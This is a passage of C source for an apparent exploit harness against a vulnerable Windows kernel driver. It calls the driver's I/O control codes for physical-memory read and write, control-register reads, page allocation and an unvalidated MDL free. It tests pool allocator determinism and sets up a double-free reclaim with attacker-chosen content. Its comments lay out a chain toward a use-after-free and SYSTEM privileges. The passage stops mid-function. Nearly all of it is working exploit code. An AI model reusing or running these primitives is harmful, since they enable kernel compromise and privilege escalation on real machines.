        char line[128], ascii[20];
        UINT32 i, n = (bytes - o < 16) ? (bytes - o) : 16;
        size_t off = 0;
        int k;

        ascii[16] = 0;
        k = snprintf(line, sizeof(line), "    %04x  ", o);
        if (k > 0) off = (size_t)k;
        for (i = 0; i < 16; i++) {
            UINT8 b   = (i < n) ? p[o + i] : 0;
            int shown = (i < n);

            if (i == 8) {                      /* mid-row gap */
                k = snprintf(line + off, sizeof(line) - off, " ");
                if (k > 0) off += (size_t)k;
            }
            if (shown) {
                k = snprintf(line + off, sizeof(line) - off, "%02x ", b);
                ascii[i] = (b >= 0x20 && b < 0x7f) ? (char)b : '.';
            } else {
                k = snprintf(line + off, sizeof(line) - off, "   ");
                ascii[i] = ' ';
            }
            if (k > 0) off += (size_t)k;
        }
        LogA("%s|%s|", line, ascii);
    }
}

/* v4.4.2: hexdump of bytes already copied OUT of a window (safe to
 * dereference); offsets print relative to the anchor byte, which may sit
 * mid-buffer (negative starts welcome). */
static void DumpOff(LONG startOff, const UINT8 *p, UINT32 bytes)
{
    UINT32 o;

    for (o = 0; o < bytes; o += 16) {
        char   line[128];
        UINT32 i, n = (bytes - o < 16) ? (bytes - o) : 16;
        size_t off = 0;
        int    k;

        int v = (int)((LONG)startOff + (LONG)o);

        if (v < 0)
            k = snprintf(line, sizeof(line), "     -%04x  ", -v);
        else
            k = snprintf(line, sizeof(line), "      %04x  ", v);
        if (k > 0) off = (size_t)k;
        for (i = 0; i < 16; i++) {
            UINT8 b = (i < n) ? p[o + i] : 0;

            if (i == 8) {
                k = snprintf(line + off, sizeof(line) - off, " ");
                if (k > 0) off += (size_t)k;
            }
            k = snprintf(line + off, sizeof(line) - off, (i < n)
                         ? "%02x " : "   ", b);
            if (k > 0) off += (size_t)k;
        }
        LogA("%s", line);
    }
}

/* v4.4.5 [HDRDUMP]: window dump of the dbuf's own POOL_HEADER + body head,
 * read FORWARD from body-0x10 (always inside the one-page user map). The
 * 02:23 boot showed the header INTACT ('ADIO') at lure time with no
 * baseline -- both backward dumps failed because the body landed at page
 * offset 0x10 and userVa-0x60 fell outside the map. [-0x10..+0x40) is
 * reachable on every boot. */
static void HdrDump(LPCWSTR tag, ULONG_PTR userVa, BOOL pre)
{
    BYTE   buf[0x50];
    SIZE_T br = 0;

    /* v4.4.5: read FORWARD from userVa-0x10 only -- the one-page user map
     * covers exactly [userVa-(K&0xFFF), +0x1000) and (K&0xFFF) can be as
     * small as 0x10, so anything below -0x10 is OUTSIDE the map (the
     * 02:23 boot lost both dumps to exactly this). [-0x10..+0x40) is
     * always reachable: header dword0 @-0x10, tag 'ADI0' @-0x0C, body. */
    if (!ReadProcessMemory(GetCurrentProcess(),
                           (LPCVOID)(ULONG_PTR)(userVa - 0x10), buf, 0x50,
                           &br) || br != 0x50) {
        LogW(L"[%ls] window dump [-0x10..+0x40) unreadable%s", tag,
             pre ? L" (pre-fire)" : L" (post-fire)");
        return;
    }
    LogW(L"[%ls] %ls window [-0x10..+0x40); hdr dword0 @-0x10, tag "
         L"'ADIO' slot @-0x0C, body starts @0", tag,
         pre ? L"PRE-FIRE" : L"POST-FIRE");
    DumpOff(-0x10, buf, 0x50);
}

/* DEVREQ.cache values (MmMapIoSpace CACHE_TYPE) */
static const wchar_t *CacheText(UINT8 cache)
{
    switch (cache) {
    case 0:  return L"noncached";
    case 1:  return L"MmCached";
    case 2:  return L"write-combined";
    default: return L"unknown";
    }
}

/* driver-written DEVREQ.status codes (sub_140002090 / sub_140002CB8) */
static const wchar_t *DevStatusText(UINT32 st)
{
    switch (st) {
    case 0:  return L"SUCCESS";
    case 5:  return L"insufficient resources";
    case 6:  return L"invalid length parameter";
    default: return L"unexpected code";
    }
}

static UINT64 ParseU64(const wchar_t *s) { return _wcstoui64(s, NULL, 0); }

/* ============ escalation harness: [P1] reclaim measurements ==============
 *
 * Chain under test (double free load-bearing; the map primitive mints the
 * first handle and stages physical bytes -- tooling, never the escalation
 * mechanism itself):
 *
 *   stage 0  map (0xFFF028A4) .... mint a legit 'ADIO' block B at a KNOWN
 *                                  KVA (the reply hands the address over)
 *   stage 1  unmap ............... legit release: B's 0x30 nonpaged chunk
 *                                  drops onto the per-CPU free-list head
 *   reclaim ...................... the driver's OWN capture worker
 *                                  (0xFFF02888): its 0x20 'ADIO' block takes
 *                                  the head, its SECOND allocation -- an
 *                                  attacker-length buffer whose CONTENT is a
 *                                  copy of attacker-chosen physical memory --
 *                                  takes the next chunk. We land it on a
 *                                  seeded, KNOWN freed address a1 and keep
 *                                  the user mapping the worker hands back.
 *   stage 2  unmap(a1) .......... the unmap worker derefs *(a1+0x08) and
 *                                  *(a1+0x10) = OUR chosen qwords, then
 *                                  ExFreePoolTag's the LIVE capture buffer
 *                                  -> controlled-value arbitrary deref/feree
 *                                  + UAF with a stale user mapping still in
 *                                  our address space
 *   [P2]/[P3] ................... reclaim the freed buffer with a victim
 *                                  object, corrupt it through the stale
 *                                  mapping, reach SYSTEM (built after [P2]
 *                                  field measurements)
 */

/* Pin the process to one logical CPU: the 0x30-bucket free list is per-CPU
 * and DeviceIoControl runs the driver worker on the calling thread's
 * processor, so affinity is the single biggest determinism lever. */
static void PinCpu0(void)
{
    if (!SetThreadAffinityMask(GetCurrentThread(), 1)) {
        LogW(L"[!] SetThreadAffinityMask(CPU0) failed GLE=%lu -- reclaim "
             L"measurements will be noisier", GetLastError());
        return;
    }
    LogW(L"[i] pinned to CPU 0 -- per-CPU pool free-list determinism armed");
}

/* companion 0xFFF02888 (corrected v1.2; was 0xFFF02908): the capture worker (sub_140001E9C). Same DEVREQ
 * layout; cache byte is ignored (always MmCached). Reply: status @+0x0C,
 * pool block @+0x10, user VA of the DATA BUFFER @+0x18. Both live after the
 * reply; the buffer's kernel address is in the block at +0x18 and the block
 * itself can be found by the ladder. */
static BOOL DevCmdCapture(UINT64 pa, UINT32 bytes, DEVREQ *reply)
{
    DEVREQ out;
    DWORD br = 0;

    ZeroMemory(&out, sizeof(out));
    reply->mapPa  = pa;
    reply->mapLen = bytes;
    reply->cache  = 1;
    reply->status = 0;
    reply->block  = 0;
    reply->userVa = 0;
    if (!DeviceIoControl(g_dev, CMD_CAPTURE, (LPVOID)reply, TRANS_IN_LEN,
                         (LPVOID)&out, TRANS_OUT_LEN, &br, NULL)) {
        LogW(L"[i] CMD_CAPTURE transport failure detail: GLE=%lu, bytes=%lu, "
             L"out.status=0x%x out.block=0x%016llx out.userVa=0x%016llx",
             GetLastError(), br, out.status,
             (unsigned long long)out.block,
             (unsigned long long)out.userVa);
        return FALSE;
    }
    *reply = out;
    return TRUE;
}

/* v1.5 leak transports (E1.5). Layouts verified by IDA on build 218:
 * see docs/worker-audit-218.md. Both are READ-ONLY primitives. */
static BOOL DevCmdCrRead(UINT16 sel, UINT64 *val)
{
    unsigned char buf[REQ_LEN];
    DWORD br = 0;

    ZeroMemory(buf, sizeof(buf));
    *(UINT16 *)(buf + 8) = sel;
    if (!DeviceIoControl(g_dev, CMD_CRREAD, buf, REQ_LEN,
                         buf, REQ_LEN, &br, NULL)) {
        LogW(L"[x] CMD_CRREAD sel=%u transport failure: GLE=%lu bytes=%lu",
             sel, GetLastError(), br);
        return FALSE;
    }
    *val = *(UINT64 *)buf;
    return TRUE;
}

static BOOL DevCmdPhysRead(UINT64 pa, void *out, UINT32 len)
{
    unsigned char buf[0x110];
    DWORD br = 0;
    UINT16 st;

    if (!len || len > 0x100) {
        LogW(L"[x] CMD_PHYSREAD bad len %u (1..0x100)", len);
        return FALSE;
    }
    ZeroMemory(buf, sizeof(buf));
    *(UINT64 *)buf = pa;
    *(UINT16 *)(buf + 8) = (UINT16)len;
    if (!DeviceIoControl(g_dev, CMD_PHYSREAD, buf, 0x110,
                         buf, 0x110, &br, NULL)) {
        LogW(L"[x] CMD_PHYSREAD PA 0x%012llx transport failure: GLE=%lu "
             L"bytes=%lu", (unsigned long long)pa, GetLastError(), br);
        return FALSE;
    }
    st = *(UINT16 *)(buf + 0x0A);
    if (st != 0) {
        LogW(L"[x] CMD_PHYSREAD PA 0x%012llx rejected: status %u "
             L"(5 = MmMapIoSpace failed, 6 = bad len)",
             (unsigned long long)pa, st);
        return FALSE;
    }
    memcpy(out, buf + 0x0C, len);
    return TRUE;
}

/* v2.8 transports. 0xFFF02820 = direct phys write, byte-identical layout to
 * the read; 0xFFF02824 = the phys-memory scanner (see the CMD_SCAN notes). */
static BOOL DevCmdPhysWrite(UINT64 pa, const void *src, UINT32 len)
{
    unsigned char buf[0x110];
    DWORD br = 0;
    UINT16 st;

    if (!len || len > 0x100) {
        LogW(L"[x] CMD_PHYSWRITE bad len %u (1..0x100)", len);
        return FALSE;
    }
    ZeroMemory(buf, sizeof(buf));
    *(UINT64 *)buf = pa;
    *(UINT16 *)(buf + 8) = (UINT16)len;
    memcpy(buf + 0x0C, src, len);
    if (!DeviceIoControl(g_dev, CMD_PHYSWRITE, buf, 0x110,
                         buf, 0x110, &br, NULL)) {
        LogW(L"[x] CMD_PHYSWRITE PA 0x%012llx transport failure: GLE=%lu "
             L"bytes=%lu", (unsigned long long)pa, GetLastError(), br);
        return FALSE;
    }
    st = *(UINT16 *)(buf + 0x0A);
    if (st != 0) {
        LogW(L"[x] CMD_PHYSWRITE PA 0x%012llx rejected: status %u "
             L"(5 = MmMapIoSpace failed, 6 = bad len)",
             (unsigned long long)pa, st);
        return FALSE;
    }
    return TRUE;
}

static BOOL KernelCanonical(UINT64 v)
{
    return v != 0 && (v >> 48) == 0xFFFF;
}

static BOOL DevCmdScan(UINT64 startPa, UINT32 mapLen, UINT32 stride,
                       UINT32 patLen, UINT32 dumpLen, const void *pattern,
                       UINT8 *buf, UINT32 *statusOut, UINT64 *paHitOut)
{
    DWORD br = 0;

    ZeroMemory(buf, SCAN_LEN);
    *(UINT64 *)(buf + 0x00) = startPa;
    *(UINT32 *)(buf + 0x10) = mapLen;
    *(UINT32 *)(buf + 0x14) = stride;
    *(UINT32 *)(buf + 0x18) = patLen;
    *(UINT32 *)(buf + 0x1C) = dumpLen;
    memcpy(buf + 0x22, pattern, patLen);
    if (!DeviceIoControl(g_dev, CMD_SCAN, buf, SCAN_LEN,
                         buf, SCAN_LEN, &br, NULL)) {
        LogW(L"[x] CMD_SCAN from PA 0x%012llx transport failure: GLE=%lu "
             L"bytes=%lu", (unsigned long long)startPa, GetLastError(), br);
        return FALSE;
    }
    if (statusOut)
        *statusOut = *(UINT16 *)(buf + 0x20);
    if (paHitOut)
        *paHitOut = *(UINT64 *)(buf + 8);
    return TRUE;
}

/* v1.7 contiguous-buffer transports (0xFFF028AC alloc / 0xFFF028B0 free).
 * Layouts IDA-verified (sub_140001614 / sub_140001ADC, docs/worker-audit-218.md).
 * Natural struct alignment reproduces the buffer layout exactly; both codes
 * gate in/out at >= 0x38. */
typedef struct tagCONTIGREQ {
    UINT64 lowPa;      /* +0x00 in : LowestAcceptableAddress            */
    UINT64 highPa;     /* +0x08 in : HighestAcceptableAddress          */
    UINT64 physPa;     /* +0x10 out: first page PA                     */
    UINT64 userVa;     /* +0x18 out alloc / in free                   */
    UINT64 mdl;        /* +0x20 out alloc / in free                   */
    UINT64 kva;        /* +0x28 out alloc / in free (contiguous KVA)   */
    DWORD  pages;      /* +0x30 in : page count (bytes = pages << 12)  */
    WORD   status;     /* +0x34 out: 0 = ok (5 = alloc/map failure)    */
    WORD   cache;      /* +0x36 in : MEMORY_CACHING_TYPE (1 = MmCached)*/
    BYTE   pad[6];     /* -> sizeof 0x40                               */
} CONTIGREQ, *PCONTIGREQ;

static BOOL DevCmdContigAlloc(UINT64 lowPa, UINT64 highPa, UINT32 pages,
                              WORD cache, CONTIGREQ *out)
{
    DWORD br = 0;

    ZeroMemory(out, sizeof(*out));
    out->lowPa  = lowPa;
    out->highPa = highPa;
    out->pages  = pages;
    out->cache  = cache;
    if (!DeviceIoControl(g_dev, CMD_CONTIGALLOC, out, sizeof(*out),
                         out, sizeof(*out), &br, NULL)) {
        LogW(L"[x] CMD_CONTIGALLOC transport failure: GLE=%lu bytes=%lu",
             GetLastError(), br);
        return FALSE;
    }
    if (out->status != 0) {
        LogW(L"[x] CMD_CONTIGALLOC rejected: status %u (5 = alloc/map "
             L"failed)", out->status);
        return FALSE;
    }
    return TRUE;
}

static BOOL DevCmdContigFree(CONTIGREQ *req)
{
    DWORD br = 0;
    WORD  st = 0;

    if (!DeviceIoControl(g_dev, CMD_CONTIGFREE, req, sizeof(*req),
                         req, sizeof(*req), &br, NULL)) {
        LogW(L"[x] CMD_CONTIGFREE transport failure: GLE=%lu", GetLastError());
        return FALSE;
    }
    st = req->status;
    if (st != 0) {
        LogW(L"[x] CMD_CONTIGFREE rejected: status %u", st);
        return FALSE;
    }
    return TRUE;
}

/* v5.0.0 0xFFF0289C: MmAllocatePagesForMdl(Low, High, 0, pages<<12) with
 * BOTH address bounds attacker-chosen, then a user view over the pages
 * (MmMapLockedPagesSpecifyCache AccessMode=1, MmCached). sub_14000190C
 * validates nothing; the reply leaves userVa/mdl/mapped-bytes in the same
 * 0x2E buffer (PAGEALLOCREQ). */
static BOOL DevCmdPageAlloc(UINT64 lowPa, UINT64 highPa, UINT32 pages,
                            PAGEALLOCREQ *out)
{
    DWORD br = 0;

    ZeroMemory(out, sizeof(*out));
    out->lowPa  = lowPa;
    out->highPa = highPa;
    out->pages  = pages;
    if (!DeviceIoControl(g_dev, CMD_PALLOC, out, sizeof(*out),
                         out, sizeof(*out), &br, NULL)) {
        LogW(L"[x] CMD_PALLOC transport failure: GLE=%lu bytes=%lu",
             GetLastError(), br);
        return FALSE;
    }
    return TRUE;
}

/* v5.0.0 0xFFF028A0: sub_140001B6C -- with mdl != 0 it always runs
 * MmUnmapLockedPages(userVa, mdl) (when userVa != 0),
 * MmFreePagesFromMdl(mdl), ExFreePoolWithTag(mdl, 0) and writes status 0.
 * Nothing is validated: this code is the family that turns a FORGED,
 * user-resident MDL into MmFreePagesFromMdl (arbitrary-PFN retirement). */
static BOOL DevCmdPageTear(UINT64 userVa, UINT64 mdl, WORD *statusOut)
{
    PTEARREQ req, out;
    DWORD br = 0;

    ZeroMemory(&req, sizeof(req));
    ZeroMemory(&out, sizeof(out));
    req.userVa = userVa;
    req.mdl    = mdl;
    if (!DeviceIoControl(g_dev, CMD_PTEAR, (LPVOID)&req, sizeof(req),
                         (LPVOID)&out, sizeof(out), &br, NULL)) {
        LogW(L"[x] CMD_PTEAR transport failure: GLE=%lu bytes=%lu",
             GetLastError(), br);
        return FALSE;
    }
    if (statusOut)
        *statusOut = out.status;
    return TRUE;
}

/* v4.3.0 scan-as-read: one 4 KB PT page lifted through CMD_SCAN. IDA
 * (sub_1400029DC): the window maps once (start PA, mapLen, MmCached); on the
 * first full pattern match the worker maps THE HIT PA separately
 * (MmMapIoSpace(hitPA, dumpLen)) and copies dumpLen bytes to reply +0x122.
 * With stride 1 / patLen 1 / pattern 0x00 the first zero byte wins -- on a
 * page-table page that is an absent entry (bit 0 = 0), and absent entries
 * come before the kernel half, so the dump reaches the kernel-half entries
 * (e.g. PML4E[451] at +0xe18) that the physread worker cannot serve:
 * len cap <= 0x100 makes a page-base read blind past the first strip.
 * Returns the first KNOWN offset (bytes [hit..page end) recovered, bytes
 * below the hit unrecoverable by this call), or 0xFFFFFFFF if the lift
 * failed. The E2E verifies downstream are the correctness gate. */
static UINT32 ReadPhysLift(UINT64 pa, UINT8 out[0x1000])
{
    static UINT8  sbuf[SCAN_LEN];
    static UINT8  cache[0x1000];
    static UINT64 cachePa = 0;      /* lifted page (0 = none) */
    static UINT32 cacheLo = 0;
    static UINT64 dead[4];
    static UINT32 deadN = 0;
    static const BYTE pats[4] = { 0x00, 0x63, 0x01, 0xFF };
    UINT32 st = 0, hitOff, span, p;
    UINT64 pagePa = pa & ~0xFFFULL, hitPa = 0;
    int i;

    if ((pagePa & 0xFFFFFFFFULL) + 0x1000ULL > 0x100000000ULL)
        return 0xFFFFFFFF;          /* the worker walks a 32-bit low dword:
                                     * never lift a page at a 4 GB edge */
    for (i = 0; i < (int)deadN; i++)
        if (dead[i] == pagePa)
            return 0xFFFFFFFF;
    if (cachePa == pagePa) {
        memcpy(out, cache, 0x1000);
        return cacheLo;
    }
    for (p = 0; p < 4; p++) {
        if (!DevCmdScan(pagePa, 0x1000, 1, 1, 0x2000, &pats[p],
                        sbuf, &st, &hitPa) ||
            (st != 0 && st != 3))
            return 0xFFFFFFFF;      /* transport dead -- do not hammer */
        if (st == 0) {
            if (hitPa < pagePa || hitPa >= pagePa + 0x1000)
                break;
            hitOff = (UINT32)(hitPa - pagePa);
            ZeroMemory(cache, 0x1000);
            span = 0x1000 - hitOff;
            memcpy(cache + hitOff, sbuf + 0x122, span);
            cachePa = pagePa;
            cacheLo = hitOff;
            memcpy(out, cache, 0x1000);
            LogW(L"[i] phys-read: PT page 0x%012llx lifted via scan-"
                 L"as-read (first hit at +%03x, known bytes %lu..0xfff)",
                 (unsigned long long)pagePa, (unsigned)hitOff,
                 (unsigned long)hitOff);
            return cacheLo;
        }
        /* st == 3: no match for this byte -- the page may have no zero
         * byte (fully-present PT). Try the next candidate pattern. */
    }
    /* every pattern missed: pattern-exhausted, not necessarily unmappable */
    dead[deadN++ & 3] = pagePa;
    return 0xFFFFFFFF;
}

/* ReadPhysBytes: v1.5 field data showed MmMapIoSpace returning NULL for
 * some reads (GLE=8 = the worker's STATUS_NO_MEMORY). The 23:19-run decode
 * NAILED the shape: the refusal axis is REGION, not alignment -- a
 * misaligned physWRITE at the 5 GiB anchor band succeeded in the same run
 * where the PML4 page's reads failed, and the misaligned capture map
 * (anchor+0x1010, len 0x700) served the whole M5 probe. So the ladder is
 * PER-CALL adaptive now (the old code latched ONE mode from the first
 * success and then mislabeled every other region):
 *   mode 1: direct read at pa (any alignment), len as requested
 *   mode 2: 0x100-aligned window read, entry sliced from offset
 *   mode 3: 4K page-base read (only when off+len <= 0x100)
 *   mode 4: scan-as-read whole-page lift (ReadPhysLift), the only route
 *           past the physread len cap for deep PT entries
 * Per call: try the cached mode, then the rest; a serving mode becomes
 * the next call's cache (logged on change). Downstream E2E verifies gate
 * correctness; a wrong mode cannot fake a verified match. */
static int g_physReadMode = 0;   /* 0 = unknown yet, 1..4 = first mode */
static BOOL g_scanLiftOK = FALSE; /* preflight: scan window+dump proven */

static void SetPhysMode(int m)
{
    static const wchar_t *nm[5] = { L"?-", L"direct (any PA)",
        L"0x100-aligned window", L"4K page base", L"scan-as-read lift" };

    if (g_physReadMode != m) {
        g_physReadMode = m;
        LogW(L"[i] phys-read mode -> %u (%ls)", m, nm[m]);
    }
}

static BOOL ReadPhysBytes(UINT64 pa, void *out, UINT32 len)
{
    unsigned char win[0x100];
    int want[4], nwant = 0, m;

    if (!len || len > 0x100)
        return FALSE;
    if (g_physReadMode)
        want[nwant++] = g_physReadMode;
    for (m = 1; m <= 4; m++) {
        if ((m == 4 && !g_scanLiftOK) || m == g_physReadMode)
            continue;
        want[nwant++] = m;
    }
    for (m = 0; m < nwant; m++) {
        switch (want[m]) {
        case 1:
            if (DevCmdPhysRead(pa, out, len)) {
                SetPhysMode(1);
                return TRUE;
            }
            break;
        case 2: {
            UINT64 base = pa & ~(UINT64)0xFF;
            UINT32 off = (UINT32)(pa - base);

            if (off + len <= 0x100 && DevCmdPhysRead(base, win, 0x100)) {
                memcpy(out, win + off, len);
                SetPhysMode(2);
                return TRUE;
            }
            break;
        }
        case 3: {
            UINT64 base = pa & ~(UINT64)0xFFF;
            UINT32 off = (UINT32)(pa - base);

            if (off + len <= 0x100 && DevCmdPhysRead(base, win, 0x100)) {
                memcpy(out, win + off, len);
                SetPhysMode(3);
                return TRUE;
            }
            break;
        }
        case 4: {
            UINT8  page[0x1000];
            UINT32 lo = ReadPhysLift(pa, page);

            if (lo != 0xFFFFFFFF && (pa & 0xFFF) >= lo) {
                memcpy(out, page + (UINT32)(pa & 0xFFF), len);
                SetPhysMode(4);
                return TRUE;
            }
            break;
        }
        }
    }
    return FALSE;
}

static BOOL ReadPhysU64(UINT64 pa, UINT64 *val)
{
    return ReadPhysBytes(pa, val, 8);
}

/* KVA -> PA via page-table walk using CR3 (kernel DTB, read with CMD_CRREAD
 * sel=3) + phys reads via ReadPhysBytes (adaptive alignment). Handles 1GB
 * (PS in PDPT) and 2MB (PS in PD) leaves. Benign reads only. */
static BOOL KvaToPa(UINT64 cr3, UINT64 kva, UINT64 *paOut);
static BOOL ReadPhysU64M(UINT64 pa, UINT64 *val);

static BOOL KvaToPa(UINT64 cr3, UINT64 kva, UINT64 *paOut)
{
    UINT64 e;
    UINT64 idx, base, mask = 0x000FFFFFFFFFF000ULL;

    idx = (kva >> 39) & 0x1FF;
    if (!ReadPhysU64M(cr3 + idx * 8, &e) || !(e & 1)) {
        LogW(L"[x] walk: PML4E[%llu] absent/unreadable (kva 0x%016llx)",
             (unsigned long long)idx, (unsigned long long)kva);
        return FALSE;
    }
    base = e & mask;
    idx = (kva >> 30) & 0x1FF;
    if (!ReadPhysU64M(base + idx * 8, &e) || !(e & 1)) {
        LogW(L"[x] walk: PDPTE absent/unreadable");
        return FALSE;
    }
    if (e & 0x80) {                          /* 1GB leaf */
        *paOut = (e & 0x000FFFFFC0000000ULL) + (kva & 0x3FFFFFFFULL);
        return TRUE;
    }
    base = e & mask;
    idx = (kva >> 21) & 0x1FF;
    if (!ReadPhysU64M(base + idx * 8, &e) || !(e & 1)) {
        LogW(L"[x] walk: PDE absent/unreadable");
        return FALSE;
    }
    if (e & 0x80) {                          /* 2MB leaf */
        *paOut = (e & 0x000FFFFFFFE00000ULL) + (kva & 0x1FFFFFULL);
        return TRUE;
    }
    base = e & mask;
    idx = (kva >> 12) & 0x1FF;
    if (!ReadPhysU64M(base + idx * 8, &e) || !(e & 1)) {
        LogW(L"[x] walk: PTE absent/unreadable");
        return FALSE;
    }
    *paOut = (e & mask) + (kva & 0xFFFULL);
    return TRUE;
}

static BOOL ReadPhysU64(UINT64 pa, UINT64 *val);

/* ReadPhysU64 with a fallback: if the 0xFFF0281C read leg is refused
 * (MmMapIoSpace NULL inside sub_140002690 -- the driver-refused "hole"
 * bands, which hold REAL RAM: the CR3 page tables and parts of 'ffff8100'
 * pool live there), map the page through the PROVEN 0xFFF028A4 leg and
 * read the qword from the user window. Single page, immediately torn
 * down -- same mechanic as TokClassifyMapped, never bulk. */
static BOOL ReadPhysU64M(UINT64 pa, UINT64 *val)
{
    DEVREQ mp;
    UINT64 v = 0;
    SIZE_T br = 0;
    UINT32 stW = 0;

    if (ReadPhysU64(pa, val))
        return TRUE;
    if ((pa & 0xFFF) + 8 > 0x1000)
        return FALSE;
    ZeroMemory(&mp, sizeof(mp));
    if (!DevCmdMap(pa & ~0xFFFULL, 0x1000, 1, &mp) || mp.status || !mp.userVa)
        return FALSE;
    if (!ReadProcessMemory(GetCurrentProcess(),
                           (LPCVOID)(ULONG_PTR)(mp.userVa + (pa & 0xFFF)),
                           &v, 8, &br) || br != 8) {
        DevCmdUnmap(mp.block, &stW);
        return FALSE;
    }
    DevCmdUnmap(mp.block, &stW);
    *val = v;
    return TRUE;
}

/* ---- [P1]-adjacent content staging tool (map primitive; probe only, not
 * part of the escalation chain): map a PA, save the original 64 bytes, write
 * up to 8 attacker qwords, verify readback. The mapping stays live -- the
 * caller must call PhysUnpaint when done. ---- */
static BOOL PhysPaint(UINT64 pa, const UINT64 *qw, unsigned nq,
                      UINT8 saved[0x40], DEVREQ *rep)
{
    UINT64 va;
    unsigned i;

    ZeroMemory(rep, sizeof(*rep));
    if (!DevCmdMap(pa, 0x40, 1, rep)) {
        LogW(L"[x] paint: CMD_MAP DeviceIoControl failed GLE=%lu",
             GetLastError());
        return FALSE;
    }
    if (rep->status) {
        LogW(L"[x] paint: map status 0x%x (%ls)", rep->status,
             DevStatusText(rep->status));
        return FALSE;
    }
    va = rep->userVa;
    if (!va || va >= 0x800000000000ULL) {
        LogW(L"[x] paint: map returned no usable user VA");
        return FALSE;
    }
    memcpy(saved, (const void *)(uintptr_t)va, 0x40);
    for (i = 0; i < nq; i++)
        ((UINT64 *)(uintptr_t)va)[i] = qw[i];
    for (i = 0; i < nq; i++)
        if (((const UINT64 *)(uintptr_t)va)[i] != qw[i]) {
            LogW(L"[x] paint: qword %u readback mismatch -- PA 0x%012llx may "
                 L"be device memory or volatile; not restoring blindly",
                 i, (unsigned long long)pa);
            memcpy((void *)(uintptr_t)va, saved, 0x40);
            return FALSE;
        }
    return TRUE;
}

/* restore the original bytes and release the paint mapping */
static BOOL PhysUnpaint(DEVREQ *rep, const UINT8 saved[0x40])
{
    UINT64 va = rep->userVa;
    UINT32 st = 0;

    if (va && va < 0x800000000000ULL) {
        memcpy((void *)(uintptr_t)va, saved, 0x40);
        if (memcmp((const void *)(uintptr_t)va, saved, 0x40) != 0)
            LogW(L"[!] paint restore: readback still differs -- the original "
                 L"64 bytes were NOT restored");
        else
            LogW(L"[+] paint restore verified (original bytes written back)");
    }
    if (!DevCmdUnmap(rep->block, &st))
        LogW(L"[!] paint unmap DeviceIoControl failed GLE=%lu",
             GetLastError());
    return TRUE;
}

/* [P1]/E1.0 -- 3-deep LIFO determinism oracle: map A,B,C; release A,B,C in
 * order (freed order -> free list C,B,A); re-map X1,X2,X3 back-to-back and
 * require the exact reverse order X1==C && X2==B && X3==A. No reclaim race,
 * no content control -- pure allocator determinism measurement. */
static int HarnessLadder(UINT32 trials)
{
    UINT32 t, hit = 0;

    Section(L"[P1]/E1.0 LIFO determinism ladder (no crashing calls)");
    for (t = 0; t < trials; t++) {
        DEVREQ a, b, c, x1, x2, x3;
        BOOL ok;

        ZeroMemory(&a, sizeof a); ZeroMemory(&b, sizeof b);
        ZeroMemory(&c, sizeof c); ZeroMemory(&x1, sizeof x1);
        ZeroMemory(&x2, sizeof x2); ZeroMemory(&x3, sizeof x3);
        ok  = DevCmdMap(0x1000, 0x1000, 1, &a);
        ok  = ok && DevCmdMap(0x1000, 0x1000, 1, &b);
        ok  = ok && DevCmdMap(0x1000, 0x1000, 1, &c);
        ok  = ok && DevCmdUnmap(a.block, NULL);
        ok  = ok && DevCmdUnmap(b.block, NULL);
        ok  = ok && DevCmdUnmap(c.block, NULL);
        ok  = ok && DevCmdMap(0x1000, 0x1000, 1, &x1);
        ok  = ok && DevCmdMap(0x1000, 0x1000, 1, &x2);
        ok  = ok && DevCmdMap(0x1000, 0x1000, 1, &x3);
        if (!ok) {
            LogW(L"[x] trial transport failure -- aborting at trial %u", t);
            return 3;
        }
        if (x1.block == c.block && x2.block == b.block && x3.block == a.block)
            hit++;
        DevCmdUnmap(x1.block, NULL);
        DevCmdUnmap(x2.block, NULL);
        DevCmdUnmap(x3.block, NULL);
    }
    LogW(L"[P1] E1.0 result: %u/%u trials restored the whole 3-deep ladder in "
         L"exact LIFO order (X1==C && X2==B && X3==A)", hit, trials);
    if (hit == trials)
        LogW(L"[P1] [OK] the 0x30 nonpaged bucket is deterministic same-CPU "
             L"LIFO on this kernel -- reclaim choreography may assume it");
    else
        LogW(L"[P1] [ABORT] LIFO order not fully deterministic -- reclaim "
             L"choreography needs a better strategy; check background "
             L"system activity or rerun pinned");
    return (hit * 100 >= trials * 90) ? 0 : 1;
}

/* [P1]/E1.2 -- driver-self reclaim rate: stage-1 unmap of block B followed
 * IMMEDIATELY (same thread, same CPU) by another CMD_MAP whose 'ADIO' block
 * should take B's chunk off the free-list head. B2==B is the hit signal
 * (reply-address oracle; no memory readback needed). */
static int HarnessReclaim(UINT32 trials)
{
    UINT32 t, hit = 0;
    DEVREQ B, B2;

    Section(L"[P1]/E1.2 driver-self reclaim rate (stage1 -> immediate re-map)");
    for (t = 0; t < trials; t++) {
        ZeroMemory(&B, sizeof B); ZeroMemory(&B2, sizeof B2);
        if (!DevCmdMap(0x1000, 0x1000, 1, &B) ||
            !DevCmdUnmap(B.block, NULL) ||
            !DevCmdMap(0x1000, 0x1000, 1, &B2)) {
            LogW(L"[x] transport failure -- aborting at trial %u", t);
            return 3;
        }
        if (B2.block == B.block)
            hit++;
        DevCmdUnmap(B2.block, NULL);
    }
    LogW(L"[P1] E1.2 result: %u/%u immediate re-maps reclaimed the just-freed "
         L"chunk (B2 == B)", hit, trials);
    LogW(L"[P1] note: same-allocator reclaim (B2 takes B) is valid but "
         L"content is driver-written; the escalation ladder uses the capture "
         L"worker's ATTACKER-CONTENT buffer instead (see --capture/--s2)");
    return (hit * 100 >= trials * 90) ? 0 : 1;
}

/* [P1]/E1.3 -- capture-worker reclaim + attacker-content probe (BENIGN:
 * nothing here derefs attacker values, so nothing here can bugcheck).
 * Per trial: paint PA with marker bytes; seed two live blocks a1,a2 and
 * free both (free list: head a2, then a1); fire ONE capture call of len
 * 0x20. Predictions: the capture's 0x20 'ADIO' block takes a2 (head), and
 * its attacker-content buffer takes a1. Observables: reply block == a2;
 * reply userVa reads back the marker (content control + user-writable
 * 'ADIO' pool buffer); the next plain map sees an EMPTY bucket (fresh
 * address, a1/a2 consumed). Each trial leaks the capture block+buffer+MDL
 * (small; the release path for capture blocks is a different command). */
static int HarnessCapture(UINT32 trials)
{
    UINT32 t, headHit = 0, contentHit = 0, emptyHit = 0, geomHit = 0, tLive = 0;
    UINT64 marker[8];
    UINT8  saved[0x40];
    unsigned k;

    Section(L"[P1]/E1.3 capture-worker reclaim + attacker-content probe (benign)");
    for (k = 0; k < 8; k++)
        marker[k] = 0x4144694F00000000ULL + (0x0A0B0C0DULL << (k * 5));
    for (t = 0; t < trials; t++) {
        DEVREQ pn, a1, a2, cap, nxt;
        UINT8  buf[0x20];
        BOOL   bHead, bContent, bEmpty, bGeom;

        if (!PhysPaint(0x1000, marker, 8, saved, &pn)) {
